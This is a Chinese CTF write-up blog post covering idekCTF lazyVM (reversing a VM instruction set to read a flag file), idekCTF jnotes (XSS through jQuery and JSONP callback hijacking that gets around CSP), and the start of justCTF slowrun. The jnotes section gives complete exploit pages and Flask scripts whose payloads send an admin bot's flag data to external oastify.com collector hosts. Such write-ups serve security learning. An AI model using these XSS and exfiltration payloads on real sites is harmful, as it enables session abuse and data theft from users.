import X from 'src/component/X';

export default function Post() {
    return (
        <>
            <X.H1>idekCTF/rev/lazyVM</X.H1>
            <X.P>题目不给代码，只说flag在`./flag.txt`，需要自己推出指令集，大概思路如下：</X.P>
            <X.H2>utils</X.H2>
            <X.P>封装一个带有失败重试的请求函数`send`：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                import functools
                import socket
                import time


                def retry(max_retries=3):
                    def inner_decorator(func):
                        @functools.wraps(func)
                        def wrapper(*args):
                            retries = 0
                            while retries < max_retries:
                                try:
                                    return func(*args)
                                except Exception:
                                    retries += 1
                                    time.sleep(1)
                            return None

                        return wrapper

                    return inner_decorator


                @retry(max_retries=5)
                def send(payload):
                    if isinstance(payload, str):
                        payload = payload.encode("latin1")
                    assert isinstance(payload, bytes)
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect(("lazy-vm.chal.idek.team", 1337))
                    s.recv(1024)
                    s.recv(1024)
                    s.send(payload + b"\n")
                    result = s.recv(1024)
                    s.close()
                    return result.decode().strip()
                `}
            />
            <X.H2>枚举可用指令</X.H2>
            <X.P>一开始没什么思路所以给服务端发`0`~`255`的字节看看有什么回显，得到的信息是：</X.P>
            <X.CodeBlock
                language="text"
                code={String.raw`
                "0": "Thanks for playing",
                "1": "Thanks for playing",
                "2": "reg index out of range",
                "3": "reg index out of range",
                "4": "reg index out of range",
                "5": "reg index out of range",
                "6": "reg index out of range",
                "7": "Thanks for playing",
                "8": "Unknown instruction at ip=0x1",
                "9": "Unknown instruction at ip=0x0",
                "10": "Unknown instruction at ip=0x0",
                ...
                `}
            />
            <X.P>说明`\x00`~`\x08`是有意义的指令；再后面就是`i`指令可以打印当前虚拟机的状态：</X.P>
            <X.CodeBlock
                language="text"
                code={String.raw`
                ============== REGISTER ==================
                R0 = 0x0
                R1 = 0x0
                R2 = 0x0
                R3 = 0x0
                R4 = 0x0
                R5 = 0x0
                R6 = 0x0
                R7 = 0x0
                ip: 0x0
                sp: 0x64
                =================== STACK =====================
                0x0
                0x0
                0x0
                0x0
                0x0
                =================== MEMORY =====================
                The pay is only $5. Too lazy to implement this
                `}
            />
            <X.P>同时`f``l``a``g`四个字符不能出现在输入指令序列中，后面需要绕过。</X.P>
            <X.CodeBlock language="text" code="Found a forbidden character. Exit" />
            <X.H2>推断指令语法</X.H2>
            <X.P>这一部分就比较有意思了，我测试了下面的输入的回显：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                from challengeio import send

                for i in range(10):
                    print(f"Instruction {i}:")
                    for opt in ["\x00\x00", "\x04\x00", "\x08\x00", "\x99\x00",
                                "\x04\x06\x00", "\x04\x99\x00", "\x99\x06\x00", "\x99\x99\x00"]:
                        payload = bytes([i]) + opt.encode("latin1")
                        print(payload + b"\n", send(payload))
                    print("========")

                """
                Instruction 0:
                b'\x00\x00\x00\n' Thanks for playing
                b'\x00\x04\x00\n' Thanks for playing
                b'\x00\x08\x00\n' Thanks for playing
                b'\x00\x99\x00\n' Thanks for playing
                b'\x00\x04\x06\x00\n' Thanks for playing
                b'\x00\x04\x99\x00\n' Thanks for playing
                b'\x00\x99\x06\x00\n' Thanks for playing
                b'\x00\x99\x99\x00\n' Thanks for playing
                ========
                Instruction 1:
                b'\x01\x00\x00\n' Thanks for playing
                b'\x01\x04\x00\n' Thanks for playing
                b'\x01\x08\x00\n' Thanks for playing
                b'\x01\x99\x00\n' Thanks for playing
                b'\x01\x04\x06\x00\n' Thanks for playing
                b'\x01\x04\x99\x00\n' Unknown instruction at ip=0x2
                b'\x01\x99\x06\x00\n' Thanks for playing
                b'\x01\x99\x99\x00\n' Unknown instruction at ip=0x2
                ========
                Instruction 2:
                b'\x02\x00\x00\n' Thanks for playing
                b'\x02\x04\x00\n' Thanks for playing
                b'\x02\x08\x00\n' reg index out of range
                b'\x02\x99\x00\n' reg index out of range
                b'\x02\x04\x06\x00\n' Thanks for playing
                b'\x02\x04\x99\x00\n' Unknown instruction at ip=0x2
                b'\x02\x99\x06\x00\n' reg index out of range
                b'\x02\x99\x99\x00\n' reg index out of range
                ========
                Instruction 3:
                b'\x03\x00\x00\n' Thanks for playing
                b'\x03\x04\x00\n' Thanks for playing
                b'\x03\x08\x00\n' reg index out of range
                b'\x03\x99\x00\n' reg index out of range
                b'\x03\x04\x06\x00\n' Thanks for playing
                b'\x03\x04\x99\x00\n' Unknown instruction at ip=0x2
                b'\x03\x99\x06\x00\n' reg index out of range
                b'\x03\x99\x99\x00\n' reg index out of range
                ========
                Instruction 4:
                b'\x04\x00\x00\n' Thanks for playing
                b'\x04\x04\x00\n' Thanks for playing
                b'\x04\x08\x00\n' reg index out of range
                b'\x04\x99\x00\n' reg index out of range
                b'\x04\x04\x06\x00\n' Thanks for playing
                b'\x04\x04\x99\x00\n' Unknown instruction at ip=0x2
                b'\x04\x99\x06\x00\n' reg index out of range
                b'\x04\x99\x99\x00\n' reg index out of range
                ========
                Instruction 5:
                b'\x05\x00\x00\n' Thanks for playing
                b'\x05\x04\x00\n' Thanks for playing
                b'\x05\x08\x00\n' reg index out of range
                b'\x05\x99\x00\n' reg index out of range
                b'\x05\x04\x06\x00\n' Thanks for playing
                b'\x05\x04\x99\x00\n' Unknown instruction at ip=0x2
                b'\x05\x99\x06\x00\n' reg index out of range
                b'\x05\x99\x99\x00\n' reg index out of range
                ========
                Instruction 6:
                b'\x06\x00\x00\n' Unknown instruction at ip=0x3
                b'\x06\x04\x00\n' Unknown instruction at ip=0x3
                b'\x06\x08\x00\n' reg index out of range
                b'\x06\x99\x00\n' reg index out of range
                b'\x06\x04\x06\x00\n' Thanks for playing
                b'\x06\x04\x99\x00\n' Thanks for playing
                b'\x06\x99\x06\x00\n' reg index out of range
                b'\x06\x99\x99\x00\n' reg index out of range
                ========
                Instruction 7:
                b'\x07\x00\x00\n' Unknown instruction at ip=0x3
                b'\x07\x04\x00\n' Unknown instruction at ip=0x3
                b'\x07\x08\x00\n' Unknown instruction at ip=0x3
                b'\x07\x99\x00\n' Unknown instruction at ip=0x3
                b'\x07\x04\x06\x00\n' Thanks for playing
                b'\x07\x04\x99\x00\n' reg index out of range
                b'\x07\x99\x06\x00\n' Thanks for playing
                b'\x07\x99\x99\x00\n' reg index out of range
                ========
                Instruction 8:
                b'\x08\x00\x00\n' Thanks for playing
                b'\x08\x04\x00\n' Unknown instruction at ip=0x3
                b'\x08\x08\x00\n' Thanks for playing
                b'\x08\x99\x00\n' Unknown instruction at ip=0x1
                b'\x08\x04\x06\x00\n' Thanks for playing
                b'\x08\x04\x99\x00\n' reg index out of range
                b'\x08\x99\x06\x00\n' Unknown instruction at ip=0x1
                b'\x08\x99\x99\x00\n' Unknown instruction at ip=0x1
                ========
                Instruction 9:
                b'\t\x00\x00\n' Unknown instruction at ip=0x0
                b'\t\x04\x00\n' Unknown instruction at ip=0x0
                b'\t\x08\x00\n' Unknown instruction at ip=0x0
                b'\t\x99\x00\n' Unknown instruction at ip=0x0
                b'\t\x04\x06\x00\n' Unknown instruction at ip=0x0
                b'\t\x04\x99\x00\n' Unknown instruction at ip=0x0
                b'\t\x99\x06\x00\n' Unknown instruction at ip=0x0
                b'\t\x99\x99\x00\n' Unknown instruction at ip=0x0
                ========
                """
                `}
            />
            <X.P>注意到枚举可用指令这一步有些指令回显是`reg index out of range`，说明有的指令的参数是寄存器编号。（实际上这里是把`\\n`当做了参数，`\\n`字节码是`\x0a`超过了寄存器数量所以报错了）</X.P>
            <X.P>这里已经意识到`\x00`可能是`halt`指令，所以构造的`8`个测试项都以`\x00`结尾。长度不同是考虑到可能有的指令接收两个参数，参数的值主要取小于等于`7`和大于`7`两种情况，为了测试哪些参数代表寄存器编号，哪些代表立即数。这些测试项的选取很主观，但也差不多够推断出指令集了。</X.P>
            <X.P>举几个例子：</X.P>
            <X.Uli>`\x00`回显均为`Thanks for playing`，显然是结束符；</X.Uli>
            <X.Uli>`\x01`回显中没有`reg index out of range`，说明`\x01`的入参应该是立即数或地址；如果用`i`打印信息，会发现数据被写进栈了，因此可以判断`\x01`指令是`push (imm)`；</X.Uli>
            <X.Uli>`\x02`和`\x03`的入参与寄存器编号有关，并且用`i`打印信息发现`sp`变了，判断分别是`pop (Rx)`和`push (Rx)`；</X.Uli>
            <X.Uli>`\x06`和`\x07`，输入`\x06\x00\x00\\n`和`\x07\x00\x00\\n`都回显`Unknown instruction at ip=0x3`，说明取指取到了`\\n`，也就是这两个指令都需要两个操作数作为参数，从后几个测试项的报错可以看出`\x06`的第一个操作数是寄存器编号，而`\x07`的第二个操作数是寄存器编号；</X.Uli>
            <X.Uli>`\x08`从测试的回显来看是无操作数指令，发现当`R0`大于`4`时会报错`unknown syscall`，判断是`syscall`指令；</X.Uli>
            <X.Uli>...</X.Uli>
            <X.P>推理过程没有写的特别细致（sorry），最终得到的指令集如下：</X.P>
            <X.CodeBlock
                language="text"
                code={String.raw`
                Instructions:

                \x00: 0 opt(s),             halt
                \x01: 1 opt(s), data        push (imm)
                \x02: 1 opt(s), Rx          pop  (Rx)
                \x03: 1 opt(s), Rx          push (Rx)
                \x04: 1 opt(s), Rx          or   (Rx)       => R0 |= Rx
                \x05: 1 opt(s), Rx          xor  (Rx)       => R0 ^= Rx
                \x06: 2 opt(s), Rx, addr    load (Rx, data) => Rx = mem[addr]
                \x07: 2 opt(s), addr, Rx    store(addr, Rx) => mem[addr] = Rx

                \x08: 0 opt(s),             syscall
                                            R0         R1     R2     R3
                                            0: read   (fd,    addr,  size)
                                            1: write  (fd,    addr,  size)
                                            2: open   (path,  flags)
                                            3: close  (fd)
                `}
            />
            <X.H2>读出flag</X.H2>
            <X.P>系统调用号和参数含义（从`R1`开始传）是一致于Linux的。拿flag的思路是利用运算指令绕过过滤，构造出`flag.txt`字符串，然后`open`文件，`read`内容到内存，最后用`write`输出。</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                from challengeio import send


                def store(s):
                    payload = b""
                    for offset, ch in enumerate(s):
                        offset = bytes([offset])
                        # 'f','l','a','g' is forbidden
                        if ch in "flag":
                            ch_xor_0xff = bytes([ord(ch) ^ 0xFF])
                            payload += b"\x01" + ch_xor_0xff  # push(ch ^ 0xFF)
                            payload += b"\x02\x00"  # pop(R0)
                            payload += b"\x01\xff"  # push(0xFF)
                            payload += b"\x02\x07"  # pop(R7)
                            payload += b"\x05\x07"  # R0 ^= R7
                            payload += b"\x07" + offset + b"\x00"  # store(offset, R0)
                        else:
                            ch = bytes([ord(ch)])
                            payload += b"\x01" + ch  # push(ch)
                            payload += b"\x02\x07"  # pop(R7)
                            payload += b"\x07" + offset + b"\x07"  # store(offset, R7)
                    return payload


                def open():
                    payload = b"\x01\x02"  # push(2) -> R0, syscall_number = 2 (open)
                    payload += b"\x01\x00"  # push(0) -> R1, path_addr = 0x00 (flag.txt)
                    payload += b"\x01\x00"  # push(0) -> R2, flags = 0 (read-only)
                    payload += b"\x02\x02\x02\x01\x02\x00"  # pop(R2), pop(R1), pop(R0)
                    payload += b"\x08"  # syscall
                    payload += b"\x03\x00\x02\x06"  # push(R0), pop(R6) -> R6 = fd
                    payload += b"\x08"  # syscall
                    return payload


                def read(size):
                    size = bytes([size])
                    payload = b"\x01\x00"  # push(0) -> R0, syscall_number = 0 (read)
                    payload += b"\x03\x06"  # push(R6) -> R1, fd = R6 (result of open syscall)
                    payload += b"\x01\x00"  # push(0) -> R2, start_addr = 0x00
                    payload += b"\x01" + size  # push(size) -> R3
                    payload += b"\x02\x03\x02\x02\x02\x01\x02\x00"  # pop(R3), pop(R2), pop(R1), pop(R0)
                    payload += b"\x08"  # syscall
                    return payload


                def output(size):
                    size = bytes([size])
                    payload = b"\x01\x01"  # push(1) -> R0, syscall_number = 1 (write)
                    payload += b"\x01\x01"  # push(1) -> R1, fd = 1 (stdout)
                    payload += b"\x01\x00"  # push(0) -> R2, start_addr = 0x00
                    payload += b"\x01" + size  # push(size) -> R3
                    payload += b"\x02\x03\x02\x02\x02\x01\x02\x00"  # pop(R3), pop(R2), pop(R1), pop(R0)
                    payload += b"\x08"  # syscall
                    return payload


                size = 45
                payload = store("flag.txt") + open() + read(size) + output(size) + b"\x00"
                print(payload)
                print(send(payload))  # idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}Thanks for playing

                # idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}
                `}
            />
            <X.H1>idekCTF/web/jnotes（赛后）</X.H1>
            <X.H2>题目文件</X.H2>
            <X.P>展示几个涉及到的关键文件：</X.P>
            <X.P>`server.js`：</X.P>
            <X.CodeBlock
                language="js"
                code={String.raw`
                const express = require("express");
                const path = require("path");
                const crypto = require("crypto");
                const cookieParser = require("cookie-parser");
                const app = express();

                app.use(express.json());
                app.set("view engine", "ejs");
                app.set("views", path.join(__dirname, "views"));
                app.use(express.static("public"));
                app.use(cookieParser());

                const get_id = () => crypto.randomBytes(16).toString("hex");

                const notes = new Map;

                /* post a note */
                app.post("/api/post", (req, res) => {
                    const {
                        noteTitle,
                        noteContent
                    } = req.body;
                    if (!noteTitle || typeof noteTitle !== "string" || !noteContent || typeof noteContent !== "string") {
                        return res.status(400).json({
                            message: "invalid note"
                        });
                    }
                    const id = get_id();
                    notes.set(id, {
                        noteTitle,
                        noteContent
                    });
                    return res.json({
                        id
                    });
                });

                /* retrieve a note */
                app.get("/api/view/:note", (req, res) => {
                    return res.jsonp(notes.get(req.params.note));
                });

                /* retrieve the flag */
                app.get("/api/flag", (req, res) => {
                    if (req.cookies.secret === process.env.SECRET) {
                        return res.json({
                            flag: process.env.FLAG
                        });
                    } else {
                        return res.json({
                            error: "unauthorized"
                        });
                    }
                });

                /* view a note */
                app.get("/note/:id", (req, res) => {
                    return res.render("notes", {
                        note: req.params.id
                    });
                });

                /* index */
                app.use("*path", (req, res) => {
                    return res.render("index");
                });

                app.listen(process.env.PORT || 1337, () => {
                    console.log("listening...")
                });
                `}
            />
            <X.P>`views/index.ejs`：</X.P>
            <X.CodeBlock
                language="html"
                code={String.raw`
                <html>

                <head>
                    <link rel="stylesheet" href="/style.css">
                    <script src="https://code.jquery.com/jquery-3.7.1.js"
                        integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous">
                    </script>
                </head>

                <h1>Post a <em>JNote</em></h1>
                <form id="noteForm">
                    <h2>Title</h2>
                    <input id="noteTitle" name="noteTitle" placeholder="title" size="50" />
                    </br>
                    <h2>Content</h2>
                    <input id="noteContent" name="noteContent" placeholder="content" size="50"></input>
                    </br>
                    </br>
                    <input type="submit" value="Post" />
                </form>
                <p id="message"></p>

                <footer>
                    <script src="/index.js"></script>
                </footer>

                </html>
                `}
            />
            <X.P>`views/notes.ejs`：</X.P>
            <X.CodeBlock
                language="html"
                highlightLines="5,14"
                code={String.raw`
                <html>

                <head>
                    <meta http-equiv="Content-Security-Policy"
                        content="default-src 'none'; script-src 'self' https://code.jquery.com/jquery-3.7.1.js; connect-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;">
                    <link rel="stylesheet" href="/style.css">
                    <script src="https://code.jquery.com/jquery-3.7.1.js"
                        integrity="sha256-eKhayi8LEQwp4NKxN+CfCh+3qOVUtJn3QNZ0TciWLP4=" crossorigin="anonymous">
                    </script>
                    <script src="/view.js"></script>
                </head>

                <body>
                    <script defer src="/api/view/<%= note %>?callback=showNote"></script>
                    <div id="noteElement">
                        <h1 id="noteTitle"></h1>
                        <p id="noteContent"></p>
                    </div>
                </body>

                </html>
                `}
            />
            <X.P>`public/view.js`：</X.P>
            <X.CodeBlock
                language="js"
                code={String.raw`
                function showNote(note) {
                    titleElement = $("#noteTitle");
                    contentElement = $("#noteContent");
                    titleElement.text(note["noteTitle"]);
                    contentElement.html(note["noteContent"]);
                };
                `}
            />
            <X.H2>题目概览</X.H2>
            <X.P>题目是一个笔记应用，允许用户发送HTML笔记，笔记的内容通过`contentElement.html(note["noteContent"])`展示，最终需要XSS带外Admin Bot对`/api/flag`的请求。Admin Bot的cookie是httpOnly的。</X.P>
            <X.P>笔记展示页面`/note/...`有CSP限制，可利用的点几乎只有`script-src 'self'`；`index`页面则没有CSP。</X.P>
            <X.P>题目的后端是Express，前端引入了jQuery，并且对`/api/view/...`的请求会返回一个JSONP格式的响应，本题就是需要用jQuery和JSONP组合来实现XSS。（框架都是最新版，不是Nday利用的题目。）</X.P>
            <X.P>Admin Bot可以访问输入的任何URL，因此允许我们构造一个攻击页面并发送给Bot。</X.P>
            <X.H2>前期思路</X.H2>
            <X.P>首先，看到Express中处理JSONP的@源码[https://github.com/expressjs/express/blob/master/lib/response.js#L267-L311]@：`callback = callback.replace(/[^\[\]\w\$.]/g, '');`，这里只允许使用`A-Za-z0-9[].\$`这些字符，无法通过在`callback`中插入特殊字符进行注入。</X.P>
            <X.P>`notes.ejs`中使用JSONP的方式为`src="/api/view/&lt;%= note %&gt;?callback=showNote"`，可以通过访问`/note/anything%3fcallback=alert%23`来触发`alert`，原理是替换进模板后引入的`src`会变成`src="/api/view/anything?callback=alert#?callback=showNote"`。我们可以通过这个操作实现执行任意函数，比如：</X.P>
            <X.Uli>`alert`</X.Uli>
            <X.Uli>`console.log`</X.Uli>
            <X.Uli>`document.firstElementChild.nextElementSibling.click`</X.Uli>
            <X.Uli>`document.forms[0].submit`</X.Uli>
            <X.Uli>...</X.Uli>
            <X.P>但可惜的是无法控制参数，当传入一个非法/不存在的`note_id`时，相当于对这个函数进行空参调用；当传入一个合法的`note_id`时，相当于有一个参数`notes.get(req.params.note)`，但这个参数仅当调用`showNote`时才有意义。（或者用`console.log`打印出来这个对象 ^v^）</X.P>
            <X.H2>Official Solution</X.H2>
            <X.P>官方解法的思路是构造一个攻击页面，通过`iframe`加载`index`页面（没有CSP），然后想办法在`index`页面中定义并执行`showNote`函数。官方解法需要一些条件/特性：</X.P>
            <X.Uli>首先注意到`index.ejs`和`notes.ejs`中都有`id="noteContent"`的元素（一个是`input`，一个是`p`），这样保证了在`index`页面中执行`showNote`时仍然可以设置`#noteContent`元素的HTML内容；</X.Uli>
            <X.Uli>jQuery的`$.ajax(url)`在空参调用时，会默认使用`location.href`作为`url`；</X.Uli>
            <X.Uli>
                <X.P>jQuery中有一个函数`$._evalUrl(url)`，可以解析执行`url`返回的JavaScript代码：</X.P>
                <X.CodeBlock
                    language="js"
                    code={String.raw`
                    jQuery._evalUrl = function (url, options, doc) {
                        return jQuery.ajax({
                            url: url,

                            // Make this explicit, since user can override this through ajaxSetup (trac-11264)
                            type: "GET",
                            dataType: "script",
                            cache: true,
                            async: false,
                            global: false,

                            // Only evaluate the response if it is successful (gh-4126)
                            // dataFilter is not invoked for failure responses, so using it instead
                            // of the default converter is kludgy but it works.
                            converters: {
                                "text script": function () {
                                }
                            },
                            dataFilter: function (response) {
                                jQuery.globalEval(response, options, doc);
                            }
                        });
                    };
                    `}
                />
                <X.P>尽管我们不能控制`url`参数，注意到`jQuery._evalUrl`是使用`jQuery.ajax`的，因此空参调用时会解析并执行`location.href`，我们需要`location.href`指向一个返回JavaScript代码的URL。</X.P>
            </X.Uli>
            <X.Uli>
                <X.P>`server.js`中的路由：</X.P>
                <X.CodeBlock
                    language="js"
                    code={String.raw`
                    /* index */
                    app.use("*path", (req, res) => {
                        return res.render("index");
                    });
                    `}
                />
                <X.P>会在其他路由均失配时默认返回`index`页面。</X.P>
            </X.Uli>
            <X.H3>Step 1</X.H3>
            <X.P>首先，在攻击页面中创建这样一个`iframe`：</X.P>
            <X.CodeBlock
                language="html"
                code={String.raw`
                <iframe srcdoc="
                    <form method='POST' action='{{target}}/view.js'>
                    <script>
                        document.forms[0].submit();
                    </script>
                "></iframe>
                `}
            />
            <X.P>我使用Flask作为托管攻击页面的服务器，`target`在这里是这道题目的地址。这个`iframe`通过POST方法请求加载`/view.js`，这会导致定义的路由均失配，最终匹配到`*path`并返回`index`页面；并且这个页面的`location.href`会变成`/view.js`：</X.P>
            <X.Image src="1.jpg" filterDarkTheme />
            <X.P>（如果不用`srcdoc`而是`src=".../view.js"`，则会返回纯文本的JavaScript代码内容，这样就没有办法加载`index`页面了。）</X.P>
            <X.H3>Step 2</X.H3>
            <X.P>现在`index`页面中有我们需要的jQuery库和`#noteContent`元素，但是`showNote`函数是未定义的，而这个函数就定义在`/view.js`中。因此我们上一步将第一个`iframe`的`location.href`操作成`/view.js`，就是为了这一步空参调用`$._evalUrl`做铺垫。空参调用时默认使用`location.href`做参数，也就会解析执行我们需要的`/view.js`了。</X.P>
            <X.P>现在在攻击页面中添加下面的代码：</X.P>
            <X.CodeBlock
                language="html"
                code={String.raw`
                <script>
                    const iframe2 = document.createElement("iframe");
                    iframe2.src = "{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23";
                    document.body.appendChild(iframe2);
                </script>
                `}
            />
            <X.P>利用前面提到的劫持`callback`的方法，通过引入第二个`iframe`，相当于执行了`top.frames[0].$._evalUrl()`。（注意传入的`note_id`是`"anything"`，后端并不会匹配到合法的`note`对象。）</X.P>
            <X.P>这个操作实际上是在第一个`iframe`中定义了`showNote`函数。</X.P>
            <X.H3>Step 3</X.H3>
            <X.P>回顾一下我们目前做了什么：我们的第一个`iframe`页面是与`target`同源的，也加载了jQuery库，并且也有`#noteContent`元素；我们通过引入第二个`iframe`触发JSONP，间接地在第一个`iframe`中完成了对`showNote`函数的定义。重要的是，第一个`iframe`页面中是没有CSP限制的，因此我们可以在这个页面中渲染恶意笔记，触发XSS。</X.P>
            <X.P>我们在Flask服务端代码中创建一个笔记，并把`note_id`保存下来，传给模板：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                payload = "<img src=x onerror='alert(0)'>"
                resp = requests.post(target + "/api/post", json={"noteContent": payload, "noteTitle": "anything"})
                note_id = resp.json()["id"]
                `}
            />
            <X.CodeBlock
                language="html"
                code={String.raw`
                <script>
                    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
                    (async () => {
                        await sleep(5000);
                        const iframe2 = document.createElement("iframe");
                        iframe2.src = "{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23";
                        document.body.appendChild(iframe2);

                        await sleep(1000);
                        const iframe3 = document.createElement("iframe");
                        iframe3.src = "{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23";
                        document.body.appendChild(iframe3);
                    })();
                </script>
                `}
            />
            <X.P>这次我们通过引入第三个`iframe`触发JSONP，间接地在第一个`iframe`中执行了`showNote`函数，渲染了包含`payload`的笔记内容，实现了XSS。为了保证正确的执行顺序，在加载每个`iframe`前加入了延时。</X.P>
            <X.H3>Step 4</X.H3>
            <X.P>正式利用时需要对`payload`稍作修改，引入带外逻辑；同时由于`cookie`是没有`SameSite=None`的，因此直接在`iframe`中访问`/api/flag`时是没有`cookie`的，需要通过`window.open`打开一个新窗口来访问。</X.P>
            <X.H3>完整代码</X.H3>
            <X.P>最终的攻击页面代码如下：</X.P>
            <X.P>`index.html`：</X.P>
            <X.CodeBlock
                language="html"
                code={String.raw`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <title>Exploit</title>
                </head>
                <body>
                <iframe srcdoc="
                    <form method='POST' action='{{target}}/view.js'>
                    <script>
                        document.forms[0].submit();
                    </script>
                "></iframe>
                <script>
                    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
                    (async () => {
                        await sleep(5000);
                        const iframe2 = document.createElement("iframe");
                        iframe2.src = "{{target}}/note/anything%3fcallback=top.frames[0].$._evalUrl%23";
                        document.body.appendChild(iframe2);

                        await sleep(1000);
                        const iframe3 = document.createElement("iframe");
                        iframe3.src = "{{target}}/note/{{note_id}}%3fcallback=top.frames[0].showNote%23";
                        document.body.appendChild(iframe3);
                    })();
                </script>
                </body>
                </html>
                `}
            />
            <X.P>`exp.py`：</X.P>
            <X.CodeBlock
                language="python"
                code={`
                from flask import Flask, render_template
                import requests

                target = "https://jnotes-web.chal.idek.team"

                payload = """<img src=x onerror='
                    const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
                    const tab = window.open(\`/api/flag\`);
                    sleep(3000).then(() => fetch("//ta7dkoi5sodij8u1k6eft29ybphg56tv.oastify.com/?flag=" + tab.document.body.innerText));
                '>"""

                resp = requests.post(target + "/api/post", json={"noteContent": payload, "noteTitle": "anything"})
                note_id = resp.json()["id"]
                print(note_id)

                app = Flask(__name__, template_folder=".")


                @app.route("/")
                def index():
                    return render_template("index.html", target=target, note_id=note_id)


                app.run("0.0.0.0", 5003)
                `}
            />
            <X.Image src="2.jpg" filterDarkTheme />
            <X.H2>Community Solution</X.H2>
            <X.P>首先除了通过`/note/anything%3fcallback=alert%23`来触发`alert`，还有一种方法是设置笔记的内容为：</X.P>
            <X.CodeBlock
                language="html"
                code={String.raw`
                <iframe srcdoc='<script src="/api/view/anything?callback=alert"></script>'></iframe>
                `}
            />
            <X.P>然后正常访问这个笔记（`/note/...`）就会触发`alert`；因此后面我想通过`a`标签的`href`带外，因为通过JSONP可以触发点击事件，但是在`iframe`中的`a`标签点击时会被CSP限制：</X.P>
            <X.CodeBlock
                language="text"
                code={String.raw`
                Refused to frame '...' because it violates the following Content Security Policy directive: "default-src 'none'". Note that 'frame-src' was not explicitly set, so 'default-src' is used as a fallback.
                `}
            />
            <X.P>我一直以为这个是无法绕过的，但其实只需要给`a`标签添加`target="_blank"`或`target="_top"`属性就可以了。顺着这个思路，看到一个有意思的民间解法，同样是构造一个攻击页面：</X.P>
            <X.CodeBlock
                language="html"
                code={String.raw`
                <script>
                    window.open("{{target}}/note/{{note_id}}");
                    location.href = "{{target}}/api/flag";
                </script>
                `}
            />
            <X.P>在访问这个页面时，会打开一个新窗口加载笔记，然后当前窗口跳转到`/api/flag`；</X.P>
            <X.P>在笔记页面，创建多个`a`标签：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                i = 9
                # {"flag":"idek{...}"}
                #          ^
                #         i=9

                anchors = "\n".join([
                    f'<a id="{ch}" href="//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_{i - 9}={ch}" target="_blank">{ch}</a>'
                    for ch in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"
                ])
                payload = f"""
                    <iframe srcdoc='
                        {anchors}
                        <script src="/api/view/anything?callback=window[top.opener.document.body.innerText[{i}]].click"></script>
                    '></iframe>
                """
                `}
            />
            <X.Uli>为`a`标签设置了`id=xxx`后，可以通过`window.xxx`访问到这个元素；（对任意标签都适用）</X.Uli>
            <X.Uli>
                <X.P>注意这些`a`标签是在`iframe`中定义并被点击的，而这里的`iframe`作为笔记内容被加载；此时JSONP回调中：</X.P>
                <X.Uli>`top`取得的是笔记页面的`window`对象；</X.Uli>
                <X.Uli>`top.opener`取得的是攻击页面的`window`对象；（因为是通过攻击页面`window.open`打开的笔记页面）</X.Uli>
                <X.Uli>攻击页面在打开笔记页面后，立刻跳转到了`/api/flag`，此时`top.opener.document.body.innerText`就是flag的内容了！因此这里`top.opener.document.body.innerText[...]`刚好取到了`/api/flag`的响应的第`i`个字符；</X.Uli>
                <X.Uli>`window[...]`又拿到了对应的`a`标签，最后通过`click`带外。</X.Uli>
            </X.Uli>
            <X.H3>完整代码</X.H3>
            <X.P>最终的攻击页面代码如下：</X.P>
            <X.P>`index.html`：</X.P>
            <X.CodeBlock
                language="html"
                code={String.raw`
                <!DOCTYPE html>
                <html lang="en">
                <head>
                    <title>Exploit</title>
                </head>
                <body>
                <script>
                    window.open("{{target}}/note/{{note_id}}");
                    location.href = "{{target}}/api/flag";
                </script>
                </body>
                </html>
                `}
            />
            <X.P>`exp.py`：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                from flask import Flask, render_template
                import requests

                target = "https://jnotes-web.chal.idek.team"

                i = 9
                # {"flag":"idek{...}"}
                #          ^
                #         i=9

                anchors = "\n".join([
                    f'<a id="{ch}" href="//caqwk7ios7d1jrukkpeytl9hb8hz5sth.oastify.com/?flag_{i - 9}={ch}" target="_blank">{ch}</a>'
                    for ch in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}"
                ])
                payload = f"""
                    <iframe srcdoc='
                        {anchors}
                        <script src="/api/view/anything?callback=window[top.opener.document.body.innerText[{i}]].click"></script>
                    '></iframe>
                """

                resp = requests.post(target + "/api/post", json={"noteContent": payload, "noteTitle": "anything"})
                note_id = resp.json()["id"]
                print(note_id)

                app = Flask(__name__, template_folder=".")


                @app.route("/")
                def index():
                    return render_template("index.html", target=target, note_id=note_id)


                app.run("0.0.0.0", 5003)
                `}
            />
            <X.Image src="3.jpg" filterDarkTheme />
            <X.Image src="4.jpg" filterDarkTheme />
            <X.P>这样就可以逐位带外flag了。（也可以考虑更自动化的实现）</X.P>
            <X.H1>justCTF/rev/slowrun</X.H1>
            <X.P>分析整个程序能看出这是一个大整数运算的实现，生成flag时有两个函数递归进行调用：</X.P>
            <X.CodeBlock
                language="text"
                code={String.raw`
                F(x): x - 4 + (73 * x**5) + (8 * x**3) + G(x-1), F(0) = 2, else F(x) = 1 for x <= 1
                G(x): F(x-1) + 3F(x-2) - 5F(x-3) + (3 * x**4), G(x) = 1 for x <= 1
                flag = F(13337) % A + B
                `}
            />
            <X.P>A和B是两个大整数常数，可以直接在程序中找到。`F`和`G`函数的递归调用会导致计算量非常大，直接运行会超时，用动态规划重写一下：</X.P>
            <X.CodeBlock
                language="python"
                code={String.raw`
                from Crypto.Util.number import long_to_bytes

